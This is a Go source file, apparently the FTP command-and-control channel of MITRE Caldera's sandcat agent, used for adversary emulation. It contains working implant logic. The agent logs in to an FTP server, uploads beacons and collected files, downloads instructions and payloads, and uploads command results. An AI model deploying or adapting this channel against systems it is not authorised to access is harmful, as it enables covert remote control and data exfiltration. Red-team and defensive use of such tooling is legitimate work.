package contact

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"strconv"
	"time"
	"errors"
	"os"
	"bytes"

    "github.com/jlaffaye/ftp"
	"github.com/mitre/gocat/output"
)

const (
    USER = "{FTP_C2_USER}"
	PWORD = "{FTP_C2_PASSWORD}"
	DIRECTORY = "{FTP_C2_DIRECTORY}"
)

//API communicates through FTP
type FTP struct {
	name string
	ipAddress string
	client *ftp.ServerConn
	user string
	pword string
	directory string


}

func init() {
	CommunicationChannels["FTP"] = &FTP{ name: "FTP" }
}

//GetInstructions sends a beacon and returns instructions
func (f *FTP) GetBeaconBytes(profile map[string]interface{}) []byte {
	var retProfile []byte
	retBytes, heartbeat := f.FtpBeacon(profile)
	if heartbeat == true {
		retProfile = retBytes
	}
	return retProfile
}

//GetPayloadBytes load payload bytes from github
func (f *FTP) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
	var err error
	if _, ok := profile["paw"]; !ok {
		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
		return nil, ""
	}

	data, err := f.DownloadPayload(profile["paw"].(string), payloadName)
	if err != nil {
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to download payload file: %s", err.Error()))
		return nil, ""
	}
	payloadBytes, err = StringToByteArray(data)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to convert file to payload bytes: %s", err.Error()))
		return nil, ""
	}

	return payloadBytes, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (f *FTP) C2RequirementsMet(profile map[string]interface{}, c2Config map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
        if len(profile["paw"].(string)) == 0 {
        	config["paw"] = getBeaconNameIdentifier()
            return true, config
        }
    return true, config
}

//SendExecutionResults send results to the server
func (f *FTP) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results

	data, err := ProfileToString(profileCopy)
	if err == nil{
	    err = f.UploadFileBytes(profile, "Alive.txt", []byte(data))
	    if err != nil{
	        output.VerbosePrint(fmt.Sprintf("[-] Failed to upload file bytes: %s", err.Error()))
	    }
	}

    //if _, errQuit := f.client.conn.Cmd("QUIT\r\n"); errQuit != nil {
	//if errQuit := f.client.Quit(); errQuit != nil {
    //    output.VerbosePrint(fmt.Sprintf("[-] Failed to Quit: %s", errQuit.Error()))
    //}

}

//Return 'ftp'
func (f *FTP) GetName() string {
	return f.name
}

//Return upstreamDestAddr
func (f *FTP) SetUpstreamDestAddr(upstreamDestAddr string) {
    f.ipAddress = upstreamDestAddr
    f.user = USER
	f.pword = PWORD
	f.directory = DIRECTORY

	client, errConnect := ftp.Dial(f.ipAddress)
	if errConnect != nil {
        output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP server: %s", errConnect.Error()))
        panic(errConnect)
    }
    f.client = client

    if f.user != "" {

        err := f.client.Login(f.user, f.pword)
        if err != nil {
            panic(err)
        }
    } else {
        err := f.client.Login("anonymous", "anonymous")
        if err != nil {
            panic(err)
        }
    }

}

//Upload file found by agent to server
func (f *FTP) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	paw := profile["paw"].(string)
	newData, err := ByteArrayToString(data, uploadName)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[-] Failed to convert byte array to file: %s", err.Error()))
        return err
    }

    errConn := f.ServerSetDir(paw)
    if errConn != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP Server: %s", errConn.Error()))
        return errConn
    }

	connect := f.UploadFile(uploadName, newData)
	if connect != nil {
		return connect
	}

	return nil
}

//Convert profile to string
func ProfileToString(profile map[string]interface{}) (string, error){
    profileData, err := json.Marshal(profile)
	if err != nil {
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to json marshal profile map: %s", err.Error()))
		return "", err
	}

    jsonStr := string(profileData)
	return jsonStr, nil
}

//Convert byte[] to string
func ByteArrayToString(data []byte, fileName string) (string, error) {
    file := string(data)
    if file == "" {
        err := errors.New("Byte array conversion to string failed")
        output.VerbosePrint(fmt.Sprintf("[-] Failed to write byte array to string: %s", err.Error()))
        return "", err
    }
    return file, nil
}

//Convert string to byte[]
func StringToByteArray(data string) ([]byte, error){
    fileContent := []byte(data)
    return fileContent, nil
}

//Connect to ftp server with username and password
func (f *FTP) ServerSetDir(paw string) error{
    if err := f.client.ChangeDir(f.directory+"/"+paw); err != nil {
        if err := f.client.MakeDir(f.directory+"/"+paw); err != nil{
            return err
        }
        f.client.ChangeDir(f.directory+"/"+paw)
    }

    return nil
}

//Control process to download file from server
func (f *FTP) DownloadPayload(paw string, payloadName string) (string, error){

    output.VerbosePrint(fmt.Sprintf("[-] Payload name: %s", payloadName))
    errConn := f.ServerSetDir(paw)
    if errConn != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP Server: %s", errConn.Error()))
        return "", errConn
    }

    connect := f.UploadFile("Payload.txt", payloadName)
	if connect != nil {
	    output.VerbosePrint("[!] Error sending beacon to FTP Server")
		return "", errConn
	}

	data, err := f.DownloadFile(payloadName)
	if err != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to download file from FTP Server: %s", err.Error()))
        return "", err
    }

    return data, nil
}

//Controls process to send beacon to server
func (f *FTP) FtpBeacon(profile map[string]interface{}) ([]byte, bool){
    paw := profile["paw"].(string)
    data, heartbeat := ProfileToString(profile)
    if heartbeat != nil{
        output.VerbosePrint("[!] Error converting profile map to String - cannot send beacon")
        return nil, false
    }

    errConn := f.ServerSetDir(paw)
    if errConn != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP Server: %s", errConn.Error()))
        return nil, false
    }

    connect := f.UploadFile("Alive.txt", data)
	if connect != nil {
	    output.VerbosePrint("[!] Error sending beacon to FTP Server")
		return nil, false
	}

    data, err := f.DownloadFile("Response.txt")
	if err != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to download file from FTP Server: %s", err.Error()))
        return nil, false
    }

	response, err := StringToByteArray(data)
	if err != nil {
	    output.VerbosePrint("[!] Error converting response to byte array - cannot obtain response")
		return nil, false
	}

	return response, true

}

//Upload file to server
func (f *FTP) UploadFile(filename string, data string) error{
    newData := bytes.NewBufferString(data)
    err := f.client.Stor(filename, newData)
    if err != nil {
	    return err
    }
    return nil
}

//Download file from server
func (f *FTP) DownloadFile(filename string) (string,error){
    reader, err := f.client.Retr(filename)
    if err != nil {
        panic(err)
        return "", err
    }
    defer reader.Close()
    buf, errRead := ioutil.ReadAll(reader)
    if errRead != nil {
        return "", errRead
    }
    data := string(buf)

    return data, nil
}

//Remove tmp files that were created to comunicate with server
func RemoveFile(filename string) error{
    err := os.Remove(filename)
    if err != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to remove file for cleanup: %s", err.Error()))
        return err
    }

    return nil
}

//If no paw, create one
func getBeaconNameIdentifier() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}